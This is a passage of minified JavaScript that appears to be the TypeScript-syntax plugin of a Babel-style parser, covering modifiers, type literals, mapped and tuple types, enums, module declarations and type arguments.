this.match(0)||this.match(5)||this.match(55)||this.match(21)||this.match(139)||this.isLiteralPropertyName()}tsNextTokenOnSameLineAndCanFollowModifier(){if(this.next(),this.hasPrecedingLineBreak())return!1;return this.tsTokenCanFollowModifier()}tsNextTokenCanFollowModifier(){if(this.match(106))return this.next(),this.tsTokenCanFollowModifier();return this.tsNextTokenOnSameLineAndCanFollowModifier()}tsParseModifier(Q,Y,W){if(!W0(this.state.type)&&this.state.type!==58&&this.state.type!==75)return;let G=this.state.value;if(Q.includes(G)){if(W&&this.match(106))return;if(Y&&this.tsIsStartOfStaticBlocks())return;if(this.tsTryParse(this.tsNextTokenCanFollowModifier.bind(this)))return G}return}tsParseModifiers({allowedModifiers:Q,disallowedModifiers:Y,stopOnStartOfClassStaticBlock:W,errorTemplate:G=K1.InvalidModifierOnTypeMember},H){let z=(V,K,Z,q)=>{if(K===Z&&H[q])this.raise(K1.InvalidModifiersOrder,V,{orderedModifiers:[Z,q]})},$=(V,K,Z,q)=>{if(H[Z]&&K===q||H[q]&&K===Z)this.raise(K1.IncompatibleModifiers,V,{modifiers:[Z,q]})};for(;;){let{startLoc:V}=this.state,K=this.tsParseModifier(Q.concat(Y!=null?Y:[]),W,H.static);if(!K)break;if(v$(K))if(H.accessibility)this.raise(K1.DuplicateAccessibilityModifier,V,{modifier:K});else z(V,K,K,"override"),z(V,K,K,"static"),z(V,K,K,"readonly"),H.accessibility=K;else if(ZS(K)){if(H[K])this.raise(K1.DuplicateModifier,V,{modifier:K});H[K]=!0,z(V,K,"in","out")}else{if(hasOwnProperty.call(H,K))this.raise(K1.DuplicateModifier,V,{modifier:K});else z(V,K,"static","readonly"),z(V,K,"static","override"),z(V,K,"override","readonly"),z(V,K,"abstract","override"),$(V,K,"declare","override"),$(V,K,"static","abstract");H[K]=!0}if(Y!=null&&Y.includes(K))this.raise(G,V,{modifier:K})}}tsIsListTerminator(Q){switch(Q){case"EnumMembers":case"TypeMembers":return this.match(8);case"HeritageClauseElement":return this.match(5);case"TupleElementTypes":return this.match(3);case"TypeParametersOrArguments":return this.match(48)}}tsParseList(Q,Y){let W=[];while(!this.tsIsListTerminator(Q))W.push(Y());return W}tsParseDelimitedList(Q,Y,W){return KS(this.tsParseDelimitedListWorker(Q,Y,!0,W))}tsParseDelimitedListWorker(Q,Y,W,G){let H=[],z=-1;for(;;){if(this.tsIsListTerminator(Q))break;z=-1;let $=Y();if($==null)return;if(H.push($),this.eat(12)){z=this.state.lastTokStartLoc.index;continue}if(this.tsIsListTerminator(Q))break;if(W)this.expect(12);return}if(G)G.value=z;return H}tsParseBracketedList(Q,Y,W,G,H){if(!G)if(W)this.expect(0);else this.expect(47);let z=this.tsParseDelimitedList(Q,Y,H);if(W)this.expect(3);else this.expect(48);return z}tsParseImportType(){let Q=this.startNode();if(this.expect(83),this.expect(10),!this.match(134))this.raise(K1.UnsupportedImportTypeArgument,this.state.startLoc),Q.argument=super.parseExprAtom();else Q.argument=this.parseStringLiteral(this.state.value);if(this.eat(12))Q.options=this.tsParseImportTypeOptions();else Q.options=null;if(this.expect(11),this.eat(16))Q.qualifier=this.tsParseEntityName(3);if(this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSImportType")}tsParseImportTypeOptions(){let Q=this.startNode();this.expect(5);let Y=this.startNode();if(this.isContextual(76))Y.method=!1,Y.key=this.parseIdentifier(!0),Y.computed=!1,Y.shorthand=!1;else this.unexpected(null,76);return this.expect(14),Y.value=this.tsParseImportTypeWithPropertyValue(),Q.properties=[this.finishObjectProperty(Y)],this.eat(12),this.expect(8),this.finishNode(Q,"ObjectExpression")}tsParseImportTypeWithPropertyValue(){let Q=this.startNode(),Y=[];this.expect(5);while(!this.match(8)){let W=this.state.type;if(W0(W)||W===134)Y.push(super.parsePropertyDefinition(null));else this.unexpected();this.eat(12)}return Q.properties=Y,this.next(),this.finishNode(Q,"ObjectExpression")}tsParseEntityName(Q){let Y;if(Q&1&&this.match(78))if(Q&2)Y=this.parseIdentifier(!0);else{let W=this.startNode();this.next(),Y=this.finishNode(W,"ThisExpression")}else Y=this.parseIdentifier(!!(Q&1));while(this.eat(16)){let W=this.startNodeAtNode(Y);W.left=Y,W.right=this.parseIdentifier(!!(Q&1)),Y=this.finishNode(W,"TSQualifiedName")}return Y}tsParseTypeReference(){let Q=this.startNode();if(Q.typeName=this.tsParseEntityName(1),!this.hasPrecedingLineBreak()&&this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSTypeReference")}tsParseThisTypePredicate(Q){this.next();let Y=this.startNodeAtNode(Q);return Y.parameterName=Q,Y.typeAnnotation=this.tsParseTypeAnnotation(!1),Y.asserts=!1,this.finishNode(Y,"TSTypePredicate")}tsParseThisTypeNode(){let Q=this.startNode();return this.next(),this.finishNode(Q,"TSThisType")}tsParseTypeQuery(){let Q=this.startNode();if(this.expect(87),this.match(83))Q.exprName=this.tsParseImportType();else Q.exprName=this.tsParseEntityName(3);if(!this.hasPrecedingLineBreak()&&this.match(47))Q.typeParameters=this.tsParseTypeArguments();return this.finishNode(Q,"TSTypeQuery")}tsParseTypeParameter(Q){let Y=this.startNode();return Q(Y),Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsEatThenParseType(81),Y.default=this.tsEatThenParseType(29),this.finishNode(Y,"TSTypeParameter")}tsTryParseTypeParameters(Q){if(this.match(47))return this.tsParseTypeParameters(Q)}tsParseTypeParameters(Q){let Y=this.startNode();if(this.match(47)||this.match(143))this.next();else this.unexpected();let W={value:-1};if(Y.params=this.tsParseBracketedList("TypeParametersOrArguments",this.tsParseTypeParameter.bind(this,Q),!1,!0,W),Y.params.length===0)this.raise(K1.EmptyTypeParameters,Y);if(W.value!==-1)this.addExtra(Y,"trailingComma",W.value);return this.finishNode(Y,"TSTypeParameterDeclaration")}tsFillSignature(Q,Y){let W=Q===19,G="parameters",H="typeAnnotation";if(Y.typeParameters=this.tsTryParseTypeParameters(this.tsParseConstModifier),this.expect(10),Y.parameters=this.tsParseBindingListForSignature(),W)Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(Q);else if(this.match(Q))Y.typeAnnotation=this.tsParseTypeOrTypePredicateAnnotation(Q)}tsParseBindingListForSignature(){let Q=super.parseBindingList(11,41,2);for(let Y of Q){let{type:W}=Y;if(W==="AssignmentPattern"||W==="TSParameterProperty")this.raise(K1.UnsupportedSignatureParameterKind,Y,{type:W})}return Q}tsParseTypeMemberSemicolon(){if(!this.eat(12)&&!this.isLineTerminator())this.expect(13)}tsParseSignatureMember(Q,Y){return this.tsFillSignature(14,Y),this.tsParseTypeMemberSemicolon(),this.finishNode(Y,Q)}tsIsUnambiguouslyIndexSignature(){if(this.next(),W0(this.state.type))return this.next(),this.match(14);return!1}tsTryParseIndexSignature(Q){if(!(this.match(0)&&this.tsLookAhead(this.tsIsUnambiguouslyIndexSignature.bind(this))))return;this.expect(0);let Y=this.parseIdentifier();Y.typeAnnotation=this.tsParseTypeAnnotation(),this.resetEndLocation(Y),this.expect(3),Q.parameters=[Y];let W=this.tsTryParseTypeAnnotation();if(W)Q.typeAnnotation=W;return this.tsParseTypeMemberSemicolon(),this.finishNode(Q,"TSIndexSignature")}tsParsePropertyOrMethodSignature(Q,Y){if(this.eat(17))Q.optional=!0;if(this.match(10)||this.match(47)){if(Y)this.raise(K1.ReadonlyForMethodSignature,Q);let W=Q;if(W.kind&&this.match(47))this.raise(K1.AccessorCannotHaveTypeParameters,this.state.curPosition());this.tsFillSignature(14,W),this.tsParseTypeMemberSemicolon();let G="parameters",H="typeAnnotation";if(W.kind==="get"){if(W[G].length>0){if(this.raise(S.BadGetterArity,this.state.curPosition()),this.isThisParam(W[G][0]))this.raise(K1.AccessorCannotDeclareThisParameter,this.state.curPosition())}}else if(W.kind==="set"){if(W[G].length!==1)this.raise(S.BadSetterArity,this.state.curPosition());else{let z=W[G][0];if(this.isThisParam(z))this.raise(K1.AccessorCannotDeclareThisParameter,this.state.curPosition());if(z.type==="Identifier"&&z.optional)this.raise(K1.SetAccessorCannotHaveOptionalParameter,this.state.curPosition());if(z.type==="RestElement")this.raise(K1.SetAccessorCannotHaveRestParameter,this.state.curPosition())}if(W[H])this.raise(K1.SetAccessorCannotHaveReturnType,W[H])}else W.kind="method";return this.finishNode(W,"TSMethodSignature")}else{let W=Q;if(Y)W.readonly=!0;let G=this.tsTryParseTypeAnnotation();if(G)W.typeAnnotation=G;return this.tsParseTypeMemberSemicolon(),this.finishNode(W,"TSPropertySignature")}}tsParseTypeMember(){let Q=this.startNode();if(this.match(10)||this.match(47))return this.tsParseSignatureMember("TSCallSignatureDeclaration",Q);if(this.match(77)){let W=this.startNode();if(this.next(),this.match(10)||this.match(47))return this.tsParseSignatureMember("TSConstructSignatureDeclaration",Q);else return Q.key=this.createIdentifier(W,"new"),this.tsParsePropertyOrMethodSignature(Q,!1)}this.tsParseModifiers({allowedModifiers:["readonly"],disallowedModifiers:["declare","abstract","private","protected","public","static","override"]},Q);let Y=this.tsTryParseIndexSignature(Q);if(Y)return Y;if(super.parsePropertyName(Q),!Q.computed&&Q.key.type==="Identifier"&&(Q.key.name==="get"||Q.key.name==="set")&&this.tsTokenCanFollowModifier()){if(Q.kind=Q.key.name,super.parsePropertyName(Q),!this.match(10)&&!this.match(47))this.unexpected(null,10)}return this.tsParsePropertyOrMethodSignature(Q,!!Q.readonly)}tsParseTypeLiteral(){let Q=this.startNode();return Q.members=this.tsParseObjectTypeMembers(),this.finishNode(Q,"TSTypeLiteral")}tsParseObjectTypeMembers(){this.expect(5);let Q=this.tsParseList("TypeMembers",this.tsParseTypeMember.bind(this));return this.expect(8),Q}tsIsStartOfMappedType(){if(this.next(),this.eat(53))return this.isContextual(122);if(this.isContextual(122))this.next();if(!this.match(0))return!1;if(this.next(),!this.tsIsIdentifier())return!1;return this.next(),this.match(58)}tsParseMappedType(){let Q=this.startNode();if(this.expect(5),this.match(53))Q.readonly=this.state.value,this.next(),this.expectContextual(122);else if(this.eatContextual(122))Q.readonly=!0;this.expect(0);{let Y=this.startNode();Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsExpectThenParseType(58),Q.typeParameter=this.finishNode(Y,"TSTypeParameter")}if(Q.nameType=this.eatContextual(93)?this.tsParseType():null,this.expect(3),this.match(53))Q.optional=this.state.value,this.next(),this.expect(17);else if(this.eat(17))Q.optional=!0;return Q.typeAnnotation=this.tsTryParseType(),this.semicolon(),this.expect(8),this.finishNode(Q,"TSMappedType")}tsParseTupleType(){let Q=this.startNode();Q.elementTypes=this.tsParseBracketedList("TupleElementTypes",this.tsParseTupleElementType.bind(this),!0,!1);let Y=!1;return Q.elementTypes.forEach((W)=>{let{type:G}=W;if(Y&&G!=="TSRestType"&&G!=="TSOptionalType"&&!(G==="TSNamedTupleMember"&&W.optional))this.raise(K1.OptionalTypeBeforeRequired,W);Y||(Y=G==="TSNamedTupleMember"&&W.optional||G==="TSOptionalType")}),this.finishNode(Q,"TSTupleType")}tsParseTupleElementType(){let Q=this.state.startLoc,Y=this.eat(21),{startLoc:W}=this.state,G,H,z,$,K=u9(this.state.type)?this.lookaheadCharCode():null;if(K===58)G=!0,z=!1,H=this.parseIdentifier(!0),this.expect(14),$=this.tsParseType();else if(K===63){z=!0;let Z=this.state.value,q=this.tsParseNonArrayType();if(this.lookaheadCharCode()===58)G=!0,H=this.createIdentifier(this.startNodeAt(W),Z),this.expect(17),this.expect(14),$=this.tsParseType();else G=!1,$=q,this.expect(17)}else $=this.tsParseType(),z=this.eat(17),G=this.eat(14);if(G){let Z;if(H){if(Z=this.startNodeAt(W),Z.optional=z,Z.label=H,Z.elementType=$,this.eat(17))Z.optional=!0,this.raise(K1.TupleOptionalAfterType,this.state.lastTokStartLoc)}else Z=this.startNodeAt(W),Z.optional=z,this.raise(K1.InvalidTupleMemberLabel,$),Z.label=$,Z.elementType=this.tsParseType();$=this.finishNode(Z,"TSNamedTupleMember")}else if(z){let Z=this.startNodeAt(W);Z.typeAnnotation=$,$=this.finishNode(Z,"TSOptionalType")}if(Y){let Z=this.startNodeAt(Q);Z.typeAnnotation=$,$=this.finishNode(Z,"TSRestType")}return $}tsParseParenthesizedType(){let Q=this.startNode();return this.expect(10),Q.typeAnnotation=this.tsParseType(),this.expect(11),this.finishNode(Q,"TSParenthesizedType")}tsParseFunctionOrConstructorType(Q,Y){let W=this.startNode();if(Q==="TSConstructorType"){if(W.abstract=!!Y,Y)this.next();this.next()}return this.tsInAllowConditionalTypesContext(()=>this.tsFillSignature(19,W)),this.finishNode(W,Q)}tsParseLiteralTypeNode(){let Q=this.startNode();switch(this.state.type){case 135:case 136:case 134:case 85:case 86:Q.literal=super.parseExprAtom();break;default:this.unexpected()}return this.finishNode(Q,"TSLiteralType")}tsParseTemplateLiteralType(){{let Q=this.startNode();return Q.literal=super.parseTemplate(!1),this.finishNode(Q,"TSLiteralType")}}parseTemplateSubstitution(){if(this.state.inType)return this.tsParseType();return super.parseTemplateSubstitution()}tsParseThisTypeOrThisTypePredicate(){let Q=this.tsParseThisTypeNode();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.tsParseThisTypePredicate(Q);else return Q}tsParseNonArrayType(){switch(this.state.type){case 134:case 135:case 136:case 85:case 86:return this.tsParseLiteralTypeNode();case 53:if(this.state.value==="-"){let Q=this.startNode(),Y=this.lookahead();if(Y.type!==135&&Y.type!==136)this.unexpected();return Q.literal=this.parseMaybeUnary(),this.finishNode(Q,"TSLiteralType")}break;case 78:return this.tsParseThisTypeOrThisTypePredicate();case 87:return this.tsParseTypeQuery();case 83:return this.tsParseImportType();case 5:return this.tsLookAhead(this.tsIsStartOfMappedType.bind(this))?this.tsParseMappedType():this.tsParseTypeLiteral();case 0:return this.tsParseTupleType();case 10:return this.tsParseParenthesizedType();case 25:case 24:return this.tsParseTemplateLiteralType();default:{let{type:Q}=this.state;if(W0(Q)||Q===88||Q===84){let Y=Q===88?"TSVoidKeyword":Q===84?"TSNullKeyword":US(this.state.value);if(Y!==void 0&&this.lookaheadCharCode()!==46){let W=this.startNode();return this.next(),this.finishNode(W,Y)}return this.tsParseTypeReference()}}}this.unexpected()}tsParseArrayTypeOrHigher(){let{startLoc:Q}=this.state,Y=this.tsParseNonArrayType();while(!this.hasPrecedingLineBreak()&&this.eat(0))if(this.match(3)){let W=this.startNodeAt(Q);W.elementType=Y,this.expect(3),Y=this.finishNode(W,"TSArrayType")}else{let W=this.startNodeAt(Q);W.objectType=Y,W.indexType=this.tsParseType(),this.expect(3),Y=this.finishNode(W,"TSIndexedAccessType")}return Y}tsParseTypeOperator(){let Q=this.startNode(),Y=this.state.value;if(this.next(),Q.operator=Y,Q.typeAnnotation=this.tsParseTypeOperatorOrHigher(),Y==="readonly")this.tsCheckTypeAnnotationForReadOnly(Q);return this.finishNode(Q,"TSTypeOperator")}tsCheckTypeAnnotationForReadOnly(Q){switch(Q.typeAnnotation.type){case"TSTupleType":case"TSArrayType":return;default:this.raise(K1.UnexpectedReadonly,Q)}}tsParseInferType(){let Q=this.startNode();this.expectContextual(115);let Y=this.startNode();return Y.name=this.tsParseTypeParameterName(),Y.constraint=this.tsTryParse(()=>this.tsParseConstraintForInferType()),Q.typeParameter=this.finishNode(Y,"TSTypeParameter"),this.finishNode(Q,"TSInferType")}tsParseConstraintForInferType(){if(this.eat(81)){let Q=this.tsInDisallowConditionalTypesContext(()=>this.tsParseType());if(this.state.inDisallowConditionalTypesContext||!this.match(17))return Q}}tsParseTypeOperatorOrHigher(){return bP(this.state.type)&&!this.state.containsEsc?this.tsParseTypeOperator():this.isContextual(115)?this.tsParseInferType():this.tsInAllowConditionalTypesContext(()=>this.tsParseArrayTypeOrHigher())}tsParseUnionOrIntersectionType(Q,Y,W){let G=this.startNode(),H=this.eat(W),z=[];do z.push(Y());while(this.eat(W));if(z.length===1&&!H)return z[0];return G.types=z,this.finishNode(G,Q)}tsParseIntersectionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSIntersectionType",this.tsParseTypeOperatorOrHigher.bind(this),45)}tsParseUnionTypeOrHigher(){return this.tsParseUnionOrIntersectionType("TSUnionType",this.tsParseIntersectionTypeOrHigher.bind(this),43)}tsIsStartOfFunctionType(){if(this.match(47))return!0;return this.match(10)&&this.tsLookAhead(this.tsIsUnambiguouslyStartOfFunctionType.bind(this))}tsSkipParameterStart(){if(W0(this.state.type)||this.match(78))return this.next(),!0;if(this.match(5)){let{errors:Q}=this.state,Y=Q.length;try{return this.parseObjectLike(8,!0),Q.length===Y}catch(W){return!1}}if(this.match(0)){this.next();let{errors:Q}=this.state,Y=Q.length;try{return super.parseBindingList(3,93,1),Q.length===Y}catch(W){return!1}}return!1}tsIsUnambiguouslyStartOfFunctionType(){if(this.next(),this.match(11)||this.match(21))return!0;if(this.tsSkipParameterStart()){if(this.match(14)||this.match(12)||this.match(17)||this.match(29))return!0;if(this.match(11)){if(this.next(),this.match(19))return!0}}return!1}tsParseTypeOrTypePredicateAnnotation(Q){return this.tsInType(()=>{let Y=this.startNode();this.expect(Q);let W=this.startNode(),G=!!this.tsTryParse(this.tsParseTypePredicateAsserts.bind(this));if(G&&this.match(78)){let $=this.tsParseThisTypeOrThisTypePredicate();if($.type==="TSThisType")W.parameterName=$,W.asserts=!0,W.typeAnnotation=null,$=this.finishNode(W,"TSTypePredicate");else this.resetStartLocationFromNode($,W),$.asserts=!0;return Y.typeAnnotation=$,this.finishNode(Y,"TSTypeAnnotation")}let H=this.tsIsIdentifier()&&this.tsTryParse(this.tsParseTypePredicatePrefix.bind(this));if(!H){if(!G)return this.tsParseTypeAnnotation(!1,Y);return W.parameterName=this.parseIdentifier(),W.asserts=G,W.typeAnnotation=null,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")}let z=this.tsParseTypeAnnotation(!1);return W.parameterName=H,W.typeAnnotation=z,W.asserts=G,Y.typeAnnotation=this.finishNode(W,"TSTypePredicate"),this.finishNode(Y,"TSTypeAnnotation")})}tsTryParseTypeOrTypePredicateAnnotation(){if(this.match(14))return this.tsParseTypeOrTypePredicateAnnotation(14)}tsTryParseTypeAnnotation(){if(this.match(14))return this.tsParseTypeAnnotation()}tsTryParseType(){return this.tsEatThenParseType(14)}tsParseTypePredicatePrefix(){let Q=this.parseIdentifier();if(this.isContextual(116)&&!this.hasPrecedingLineBreak())return this.next(),Q}tsParseTypePredicateAsserts(){if(this.state.type!==109)return!1;let Q=this.state.containsEsc;if(this.next(),!W0(this.state.type)&&!this.match(78))return!1;if(Q)this.raise(S.InvalidEscapedReservedWord,this.state.lastTokStartLoc,{reservedWord:"asserts"});return!0}tsParseTypeAnnotation(Q=!0,Y=this.startNode()){return this.tsInType(()=>{if(Q)this.expect(14);Y.typeAnnotation=this.tsParseType()}),this.finishNode(Y,"TSTypeAnnotation")}tsParseType(){b$(this.state.inType);let Q=this.tsParseNonConditionalType();if(this.state.inDisallowConditionalTypesContext||this.hasPrecedingLineBreak()||!this.eat(81))return Q;let Y=this.startNodeAtNode(Q);return Y.checkType=Q,Y.extendsType=this.tsInDisallowConditionalTypesContext(()=>this.tsParseNonConditionalType()),this.expect(17),Y.trueType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.expect(14),Y.falseType=this.tsInAllowConditionalTypesContext(()=>this.tsParseType()),this.finishNode(Y,"TSConditionalType")}isAbstractConstructorSignature(){return this.isContextual(124)&&this.isLookaheadContextual("new")}tsParseNonConditionalType(){if(this.tsIsStartOfFunctionType())return this.tsParseFunctionOrConstructorType("TSFunctionType");if(this.match(77))return this.tsParseFunctionOrConstructorType("TSConstructorType");else if(this.isAbstractConstructorSignature())return this.tsParseFunctionOrConstructorType("TSConstructorType",!0);return this.tsParseUnionTypeOrHigher()}tsParseTypeAssertion(){if(this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(K1.ReservedTypeAssertion,this.state.startLoc);let Q=this.startNode();return Q.typeAnnotation=this.tsInType(()=>{return this.next(),this.match(75)?this.tsParseTypeReference():this.tsParseType()}),this.expect(48),Q.expression=this.parseMaybeUnary(),this.finishNode(Q,"TSTypeAssertion")}tsParseHeritageClause(Q){let Y=this.state.startLoc,W=this.tsParseDelimitedList("HeritageClauseElement",()=>{{let G=this.startNode();if(G.expression=this.tsParseEntityName(3),this.match(47))G.typeParameters=this.tsParseTypeArguments();return this.finishNode(G,"TSExpressionWithTypeArguments")}});if(!W.length)this.raise(K1.EmptyHeritageClauseType,Y,{token:Q});return W}tsParseInterfaceDeclaration(Q,Y={}){if(this.hasFollowingLineBreak())return null;if(this.expectContextual(129),Y.declare)Q.declare=!0;if(W0(this.state.type))Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,130);else Q.id=null,this.raise(K1.MissingInterfaceName,this.state.startLoc);if(Q.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers),this.eat(81))Q.extends=this.tsParseHeritageClause("extends");let W=this.startNode();return W.body=this.tsInType(this.tsParseObjectTypeMembers.bind(this)),Q.body=this.finishNode(W,"TSInterfaceBody"),this.finishNode(Q,"TSInterfaceDeclaration")}tsParseTypeAliasDeclaration(Q){return Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,2),Q.typeAnnotation=this.tsInType(()=>{if(Q.typeParameters=this.tsTryParseTypeParameters(this.tsParseInOutModifiers),this.expect(29),this.isContextual(114)&&this.lookaheadCharCode()!==46){let Y=this.startNode();return this.next(),this.finishNode(Y,"TSIntrinsicKeyword")}return this.tsParseType()}),this.semicolon(),this.finishNode(Q,"TSTypeAliasDeclaration")}tsInTopLevelContext(Q){if(this.curContext()!==e1.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return Q()}finally{this.state.context=Y}}else return Q()}tsInType(Q){let Y=this.state.inType;this.state.inType=!0;try{return Q()}finally{this.state.inType=Y}}tsInDisallowConditionalTypesContext(Q){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!0;try{return Q()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsInAllowConditionalTypesContext(Q){let Y=this.state.inDisallowConditionalTypesContext;this.state.inDisallowConditionalTypesContext=!1;try{return Q()}finally{this.state.inDisallowConditionalTypesContext=Y}}tsEatThenParseType(Q){if(this.match(Q))return this.tsNextThenParseType()}tsExpectThenParseType(Q){return this.tsInType(()=>{return this.expect(Q),this.tsParseType()})}tsNextThenParseType(){return this.tsInType(()=>{return this.next(),this.tsParseType()})}tsParseEnumMember(){let Q=this.startNode();if(Q.id=this.match(134)?super.parseStringLiteral(this.state.value):this.parseIdentifier(!0),this.eat(29))Q.initializer=super.parseMaybeAssignAllowIn();return this.finishNode(Q,"TSEnumMember")}tsParseEnumDeclaration(Q,Y={}){if(Y.const)Q.const=!0;if(Y.declare)Q.declare=!0;return this.expectContextual(126),Q.id=this.parseIdentifier(),this.checkIdentifier(Q.id,Q.const?8971:8459),this.expect(5),Q.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(Q,"TSEnumDeclaration")}tsParseEnumBody(){let Q=this.startNode();return this.expect(5),Q.members=this.tsParseDelimitedList("EnumMembers",this.tsParseEnumMember.bind(this)),this.expect(8),this.finishNode(Q,"TSEnumBody")}tsParseModuleBlock(){let Q=this.startNode();return this.scope.enter(0),this.expect(5),super.parseBlockOrModuleBlockBody(Q.body=[],void 0,!0,8),this.scope.exit(),this.finishNode(Q,"TSModuleBlock")}tsParseModuleOrNamespaceDeclaration(Q,Y=!1){if(Q.id=this.parseIdentifier(),!Y)this.checkIdentifier(Q.id,1024);if(this.eat(16)){let W=this.startNode();this.tsParseModuleOrNamespaceDeclaration(W,!0),Q.body=W}else this.scope.enter(1024),this.prodParam.enter(0),Q.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();return this.finishNode(Q,"TSModuleDeclaration")}tsParseAmbientExternalModuleDeclaration(Q){if(this.isContextual(112))Q.kind="global",Q.global=!0,Q.id=this.parseIdentifier();else if(this.match(134))Q.kind="module",Q.id=super.parseStringLiteral(this.state.value);else this.unexpected();if(this.match(5))this.scope.enter(1024),this.prodParam.enter(0),Q.body=this.tsParseModuleBlock(),this.prodParam.exit(),this.scope.exit();else this.semicolon();return this.finishNode(Q,"TSModuleDeclaration")}tsParseImportEqualsDeclaration(Q,Y,W){Q.isExport=W||!1,Q.id=Y||this.parseIdentifier(),this.checkIdentifier(Q.id,4096),this.expect(29);let G=this.tsParseModuleReference();if(Q.importKind==="type"&&G.type!=="TSExternalModuleReference")this.raise(K1.ImportAliasHasImportType,G);return Q.moduleReference=G,this.semicolon(),this.finishNode(Q,"TSImportEqualsDeclaration")}tsIsExternalModuleReference(){return this.isContextual(119)&&this.lookaheadCharCode()===40}tsParseModuleReference(){return this.tsIsExternalModuleReference()?this.tsParseExternalModuleReference():this.tsParseEntityName(0)}tsParseExternalModuleReference(){let Q=this.startNode();if(this.expectContextual(119),this.expect(10),!this.match(134))this.unexpected();return Q.expression=super.parseExprAtom(),this.expect(11),this.sawUnambiguousESM=!0,this.finishNode(Q,"TSExternalModuleReference")}tsLookAhead(Q){let Y=this.state.clone(),W=Q();return this.state=Y,W}tsTryParseAndCatch(Q){let Y=this.tryParse((W)=>Q()||W());if(Y.aborted||!Y.node)return;if(Y.error)this.state=Y.failState;return Y.node}tsTryParse(Q){let Y=this.state.clone(),W=Q();if(W!==void 0&&W!==!1)return W;this.state=Y}tsTryParseDeclare(Q){if(this.isLineTerminator())return;let Y=this.state.type;return this.tsInAmbientContext(()=>{switch(Y){case 68:return Q.declare=!0,super.parseFunctionStatement(Q,!1,!1);case 80:return Q.declare=!0,this.parseClass(Q,!0,!1);case 126:return this.tsParseEnumDeclaration(Q,{declare:!0});case 112:return this.tsParseAmbientExternalModuleDeclaration(Q);case 100:if(this.state.containsEsc)return;case 75:case 74:if(!this.match(75)||!this.isLookaheadContextual("enum"))return Q.declare=!0,this.parseVarStatement(Q,this.state.value,!0);return this.expect(75),this.tsParseEnumDeclaration(Q,{const:!0,declare:!0});case 107:if(this.isUsing())return this.raise(K1.InvalidModifierOnUsingDeclaration,this.state.startLoc,"declare"),Q.declare=!0,this.parseVarStatement(Q,"using",!0);break;case 96:if(this.isAwaitUsing())return this.raise(K1.InvalidModifierOnAwaitUsingDeclaration,this.state.startLoc,"declare"),Q.declare=!0,this.next(),this.parseVarStatement(Q,"await using",!0);break;case 129:{let W=this.tsParseInterfaceDeclaration(Q,{declare:!0});if(W)return W}default:if(W0(Y))return this.tsParseDeclaration(Q,this.state.value,!0,null)}})}tsTryParseExportDeclaration(){return this.tsParseDeclaration(this.startNode(),this.state.value,!0,null)}tsParseExpressionStatement(Q,Y,W){switch(Y.name){case"declare":{let G=this.tsTryParseDeclare(Q);if(G)G.declare=!0;return G}case"global":if(this.match(5)){this.scope.enter(1024),this.prodParam.enter(0);let G=Q;return G.kind="global",Q.global=!0,G.id=Y,G.body=this.tsParseModuleBlock(),this.scope.exit(),this.prodParam.exit(),this.finishNode(G,"TSModuleDeclaration")}break;default:return this.tsParseDeclaration(Q,Y.name,!1,W)}}tsParseDeclaration(Q,Y,W,G){switch(Y){case"abstract":if(this.tsCheckLineTerminator(W)&&(this.match(80)||W0(this.state.type)))return this.tsParseAbstractDeclaration(Q,G);break;case"module":if(this.tsCheckLineTerminator(W)){if(this.match(134))return this.tsParseAmbientExternalModuleDeclaration(Q);else if(W0(this.state.type))return Q.kind="module",this.tsParseModuleOrNamespaceDeclaration(Q)}break;case"namespace":if(this.tsCheckLineTerminator(W)&&W0(this.state.type))return Q.kind="namespace",this.tsParseModuleOrNamespaceDeclaration(Q);break;case"type":if(this.tsCheckLineTerminator(W)&&W0(this.state.type))return this.tsParseTypeAliasDeclaration(Q);break}}tsCheckLineTerminator(Q){if(Q){if(this.hasFollowingLineBreak())return!1;return this.next(),!0}return!this.isLineTerminator()}tsTryParseGenericAsyncArrowFunction(Q){if(!this.match(47))return;let Y=this.state.maybeInArrowParameters;this.state.maybeInArrowParameters=!0;let W=this.tsTryParseAndCatch(()=>{let G=this.startNodeAt(Q);return G.typeParameters=this.tsParseTypeParameters(this.tsParseConstModifier),super.parseFunctionParams(G),G.returnType=this.tsTryParseTypeOrTypePredicateAnnotation(),this.expect(19),G});if(this.state.maybeInArrowParameters=Y,!W)return;return super.parseArrowExpression(W,null,!0)}tsParseTypeArgumentsInExpression(){if(this.reScan_lt()!==47)return;return this.tsParseTypeArguments()}tsParseTypeArguments(){let Q=this.startNode();if(Q.params=this.tsInType(()=>this.tsInTopLevelContext(()=>{return this.expect(47),this.tsParseDelimitedList("TypeParametersOrArguments",this.tsParseType.bind(this))})),Q.params.length===0)this.raise(K1.EmptyTypeArguments,Q);else if(!this.state.inType&&this.curContext()===e1.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(Q,"TSTypeParameterInstantiation")}tsIsDeclarationStart(){return vP(this.state.type)}isExportDefaultSpecifier(){if(this.tsIsDeclarationStart())return!1;return super.isExportDefaultSpecifier()}parseBindingElement(Q,Y){let W=Y.length?Y[0].loc.start:this.state.startLoc,G={};this.tsParseModifiers({allowedModifiers:["public","private","protected","override","readonly"]},G);let{accessibility:H,override:z,readonly:$}=G;if(!(Q&4)&&(H||$||z))this.raise(K1.UnexpectedParameterModifier,W);let V=this.parseMaybeDefault();if(Q&2)this.parseFunctionParamType(V);let K=this.parseMaybeDefault(V.loc.start,V);if(H||$||z){let 